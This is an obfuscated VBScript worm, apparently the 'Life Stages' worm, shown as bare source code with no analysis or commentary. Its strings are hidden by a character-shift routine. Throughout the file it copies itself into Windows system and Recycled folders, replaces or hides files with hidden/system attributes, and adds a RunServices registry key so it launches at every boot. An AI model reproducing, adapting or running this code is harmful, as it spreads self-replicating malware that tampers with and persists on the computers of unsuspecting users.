On Error Resume Next
Set I=CreateObject("Scripting.FileSystemObject")
Set M=I.OpenTextFile(WScript.ScriptFullName,1)
Do While Mid(M.ReadLine,18,10)<>"adLine,18,"
Loop
M.SkipLine
N=M.ReadLine
M.Close
Set Z=CreateObject(T("VRbshqu/Ridmm"))
X=T("MHGD^RU@FDR/UYU/RIR")
If I.FileExists(F(A(T("Ru`suTq")),X)) Then I.DeleteFile F(A(T("Ru`suTq")),X),True
Q=False
If Not I.FileExists(F(U(0),X)) Then
If I.FileExists(F(U(1),T("LRHOGN07/UMC"))) Then
I.CopyFile F(U(1),T("LRHOGN07/UMC")),F(U(0),X)
Else
If I.FileExists(F(Left(U(0),3)&T("SDBXBMDE"),T("LRSBXBME/E@U"))) Then
I.CopyFile F(Left(U(0),3)&T("SDBXBMDE"),T("LRSBXBME/E@U")),F(U(0),X)
Set Y=I.GetFile(F(U(0),X))
Y.Attributes=32
Else
Q=True
End If
End If
End If
If Not Q Then
If Not I.FileExists(F(U(1),T("LRHOGN07/UMC"))) Then I.CopyFile F(U(0),X),F(U(1),T("LRHOGN07/UMC"))
If Not I.FileExists(F(Left(U(0),3)&T("SDBXBMDE"),T("LRSBXBME/E@U"))) Then
I.CopyFile F(U(0),X),F(Left(U(0),3)&T("SDBXBMDE"),T("LRSBXBME/E@U"))
Set Y=I.GetFile(F(Left(U(0),3)&T("SDBXBMDE"),T("LRSBXBME/E@U")))
Y.Attributes=39
End If
If Not I.FileExists(F(U(1),T("RB@OSDF/WCR"))) Then
If I.FileExists(F(Left(U(0),3)&T("SDBXBMDE"),T("SBXBMECO/E@U"))) Then
I.CopyFile F(Left(U(0),3)&T("SDBXBMDE"),T("SBXBMECO/E@U")),F(U(1),T("RB@OSDF/WCR"))
Set Y=I.GetFile(F(U(1),T("RB@OSDF/WCR")))
Y.Attributes=32
Else
Q=True
I.CopyFile F(U(0),X),F(A(T("Ru`suTq")),X)
End If
End If
End If
If Not Q Then
If Not I.FileExists(F(Left(U(0),3)&T("SDBXBMDE"),T("SBXBMECO/E@U"))) Then
I.CopyFile F(U(1),T("RB@OSDF/WCR")),F(Left(U(0),3)&T("SDBXBMDE"),T("SBXBMECO/E@U"))
Set Y=I.GetFile(F(Left(U(0),3)&T("SDBXBMDE"),T("SBXBMECO/E@U")))
Y.Attributes=39
End If
If Not I.FileExists(F(U(1),T("WC@RDU/NMC"))) Then
I.CopyFile WScript.ScriptFullName,F(U(1),T("WC@RDU/NMC"))
Set Y=I.GetFile(F(U(1),T("WC@RDU/NMC")))
Y.Attributes=32
End If
Z.RegWrite T("IJDX^MNB@M^L@BIHOD]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]StoRdswhbdr]Rb`oSdf"),F(U(0),T("VRBSHQU/DYD"))&" "&F(U(1),T("RB@OSDF/WCR"))
End If
Function T(D)
T=""
For E=1 To Len(D)
If Asc(Mid(D,E,1))<>34 And Asc(Mid(D,E,1))<>35 And Asc(Mid(D,E,1))<>126 Then
If Asc(Mid(D,E,1)) Mod 2=0 Then T=T&Chr(Asc(Mid(D,E,1))+Left(Len(N),1)) Else T=T&Chr(Asc(Mid(D,E,1))-Left(Len(N),1))
Else
T=T&Mid(D,E,1)
End If
Next
End Function
Function F(W,S)
On Error Resume Next
F=I.BuildPath(W,S)
End Function
Function A(B)
On Error Resume Next
A=Z.SpecialFolders(B)
End Function
Function U(J)
On Error Resume Next
U=I.GetSpecialFolder(J)
End Function
